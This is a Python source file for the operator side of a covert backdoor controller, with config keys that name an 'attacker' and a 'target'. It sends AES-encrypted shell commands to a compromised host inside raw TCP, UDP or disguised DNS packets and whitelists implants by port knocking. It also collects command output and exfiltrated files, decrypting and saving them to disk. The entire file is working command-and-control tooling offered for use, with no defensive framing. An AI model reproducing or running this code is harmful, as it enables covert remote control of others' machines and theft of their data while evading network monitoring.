import sys
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from scapy.fields import StrField
from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import UDP, IP, TCP
from scapy.all import sniff, send, Raw
from scapy.packet import Packet, bind_layers
from scapy.volatile import RandShort
from threading import Thread
import yaml


class Client:
    def __init__(self):
        print(f"Client has been initiated.")
        print("--------------------------------------------------------------")
        self.target_ip = ""
        self.key = b'\xac\x19\x08\xf8\x80uo\x0c5\xcb\x82_\xc9\xc0\xdc4Z=\xbf\x19\xf0O\xfa\x94\x0fW\x95\xaf=\xe9U\t'
        self.iv = b'\xe4\xba\xa2\x06\xf2\xd6U\xef\x15\xcc\xdaY\x95\xf9\xb5;'
        self.flag_begin = "****["
        self.flag_close = "]****"
        self.port = 0
        self.check = True
        self.supported_protos = ["udp", "tcp", "dns"]
        self.proto = ""
        self.sequence = []
        self.cur_pos = 0
        self.filter = ""
        self.whitelist = []
        self.file_bits = []
        self.cmd_bits = []
        self.recv_port = ""
        self.send_port = ""
        self.file_port = ""

    def start(self) -> None:
        self.process_yaml()
        self.create_thread()
        self.get_input()

    def get_input(self) -> None:
        while True:
            if self.check:
                cmd = input("Enter command:")
                self.set_check()
                msg = self.prepare_msg(cmd)
                self.craft_packet(msg)

    def set_check(self) -> None:
        self.check = not self.check

    def process_yaml(self) -> None:
        with open('config.yaml', 'r') as f:
            config = yaml.safe_load(f)

        self.target_ip = config['attacker']['target']
        self.recv_port = config['attacker']['recv_port']
        self.send_port = config['attacker']['send_port']
        self.file_port = config['share']['file_port']
        self.proto = "udp" if config['share']['proto'] in ["udp", "dns"] else "tcp"
        self.sequence = config['share']['sequence']
        self.filter = self.proto + " or tcp"

    def prepare_msg(self, cmd: str) -> str:
        cipher = self.generate_cipher()
        cmd = self.flag_begin + cmd + self.flag_close
        encrypted_data = self.encrypt_data(cipher, cmd)
        # Convert the encrypted string to bytes
        print(f"Encrypted format: {encrypted_data}")
        hex_str = self.get_hex_string(encrypted_data)
        print(f"Sent command!")
        print("--------------------------------------------------------------")
        return hex_str

    def create_thread(self) -> None:
        x = Thread(target=self.sniff_init)
        x.start()

    def sniff_init(self) -> None:
        try:
            sniff(filter=self.filter, prn=lambda p: self.filter_packets(p), store=False)
        except PermissionError:
            print("Permission error! Run as sudo or admin!")
            sys.exit()

    def process_packets(self, msg: str) -> None:
        stripped_msg = msg.strip(self.flag_begin).rstrip(self.flag_close)
        print(f"{stripped_msg}")
        print("--------------------------------------------------------------")
        self.set_check()

    def process_udp(self, packet: Packet) -> None:
        """Handles UDP packets from target machine"""
        try:
            # Handles files
            if IP in packet and packet[IP].src in self.whitelist \
                    and packet[UDP].dport == self.recv_port and packet[UDP].sport == self.file_port:
                data = packet[UDP].load

                if b'|||' in data:
                    print("end file")
                    filename = data.split(b'|||')[0]
                    filename = filename.decode()
                    self.search_cleanup()
                    self.combine_bits(filename)
                    self.file_bits = []
                else:
                    self.file_bits.append(data)
                return

            # Handles response of executed commands
            if UDP in packet and packet[UDP].dport == self.recv_port:
                data = packet[Raw].load
                if b'|||' in data:
                    self.combine_bits("")
                    self.cmd_bits = []
                else:
                    self.cmd_bits.append(data)
        except:
            return

    def process_tcp(self, packet: Packet) -> None:
        """Handles TCP packets from target machine"""
          # Handles files
        if IP in packet and packet[IP].src in self.whitelist \
                and packet[TCP].dport == self.recv_port and packet[TCP].sport == self.file_port:
            if Raw in packet:
                data = packet[Raw].load
                if b'|||' in data:
                    filename = data.split(b'|||')[0]
                    filename = filename.decode()
                    self.search_cleanup()
                    self.combine_bits(filename)
                    self.file_bits = []
                else:
                    self.file_bits.append(data)
            return

        # Handles response of executed commands
        try:
            if TCP in packet and Raw in packet and packet[TCP].dport == self.recv_port:
                data = packet[Raw].load
                if b'|||' in data:
                    self.combine_bits("")
                    self.cmd_bits = []
                else:
                    self.cmd_bits.append(data)
        except:
            return

    def search_cleanup(self):
        if not self.check:
            print("Received files......")
            print("--------------------------------------------------------------")
            self.set_check()

    def filter_packets(self, packet) -> None:
        """Various filters for packet processing, passes to
        respective processing methods
        """
        # This filter checks if the packets are a part of a valid port knocking sequence
        if packet.haslayer(IP) and packet.haslayer(TCP):
            if packet[TCP].flags & 0x02 and packet[TCP].dport == self.sequence[self.cur_pos]:
                self.cur_pos += 1
                if self.cur_pos == len(self.sequence):
                    self.whitelist.append(packet[IP].src)
                    self.cur_pos = 0
                return

        # Check if it's a file or response to command
        if self.proto == "tcp":
            self.process_tcp(packet)
        elif self.proto == "udp" or "dns":
            self.process_udp(packet)
        else:
            return

    def combine_bits(self, name: str):
        """Combines byte stream"""
        if name:
            self.save_file(name)
        else:

            self.get_command_response()

    def get_command_response(self):
        data = self.join_bytes(self.cmd_bits)
        val = self.authenticate_packet(data)
        if val:
            self.process_packets(val)

    def save_file(self, name: str) -> None:
        data = self.join_bytes(self.file_bits)
        unencrypted_data = self.decrypt_data(data)
        with open(name, 'wb') as f:
            f.write(unencrypted_data)


    def join_bytes(self, data: list) -> bytes:
        """Converts byte array into byte sequence"""
        val = b''.join(data)
        print(val)
        return val

    def authenticate_packet(self, data: bytes) -> str:
        decrypted_msg = self.decrypt_data(data)
        if decrypted_msg.startswith(self.flag_begin) and decrypted_msg.endswith(self.flag_close):
            return decrypted_msg

    def craft_packet(self, msg: str) -> None:
        if self.proto == "tcp":
            self.create_tcp(msg)
        elif self.proto == "udp":
            self.create_udp(msg)
        else:
            self.create_dns(msg)

    def create_dns(self, msg: str):
        """Creates DNS packet,embeds data in payload, and sends"""
        ip = IP(dst=self.target_ip)
        udp = UDP(sport=self.recv_port, dport=self.send_port)
        dns = DNS(rd=1, qd=DNSQR(qname="www.google.com"))
        payload = msg
        pkt = ip / udp / dns / payload
        try:
            send(pkt, verbose=0)
        except (OSError, PermissionError) as e:
            print(f"{e}")
            sys.exit()


    def create_tcp(self, msg: str) -> None:
        """Creates TCP packet,embeds data in payload, and sends"""
        msg = msg.encode()
        pkt = IP(dst=self.target_ip) / TCP(sport=RandShort(), dport=self.send_port) / Raw(load=msg)
        try:
            send(pkt, verbose=0)
        except (OSError, PermissionError) as e:
            print(f"{e}")
            sys.exit()

    def create_udp(self, msg: str) -> None:
        """Creates UDP packet,embeds data in payload, and sends"""
        ip = IP(dst=self.target_ip)
        udp = UDP(sport=self.recv_port, dport=self.send_port)
        payload = msg
        pkt = ip / udp / payload
        try:
            send(pkt, verbose=0)
        except (OSError, PermissionError) as e:
            print(f"{e}")
            sys.exit()

    def decrypt_data(self, msg: bytes) -> str:
        cipher = self.generate_cipher()
        # Initialize a decryptor object
        decryptor = cipher.decryptor()
        # Initialize an unpadder object
        unpadder = padding.PKCS7(128).unpadder()
        # Decrypt and remove padding
        padded_message = decryptor.update(msg) + decryptor.finalize()
        msg = unpadder.update(padded_message) + unpadder.finalize()
        msg = msg.decode()
        return msg

    def get_hex_string(self, encrypted_line):
        """ Returns hex string of byte stream (encrypted string)"""
        return encrypted_line.hex()

    def generate_cipher(self) -> Cipher:
        """Generates cipher for encryption"""
        return Cipher(algorithms.AES(self.key), modes.CBC(self.iv))

    def encrypt_data(self, cipher, line) -> bytes:
        """Encrypts message"""
        encryptor = cipher.encryptor()
        # Padding needed at AES requires specific byte size.
        # Allows for custom length messages.
        padder = padding.PKCS7(128).padder()
        padded_line = padder.update(line.encode()) + padder.finalize()
        encrypted_line = encryptor.update(padded_line) + encryptor.finalize()
        return encrypted_line

    def get_ascii(self, hex_char) -> int:
        """Returns ascii code of char"""
        return ord(hex_char)

    def get_char(self, ascii) -> chr:
        """Gets char from ascii code"""
        return chr(ascii)
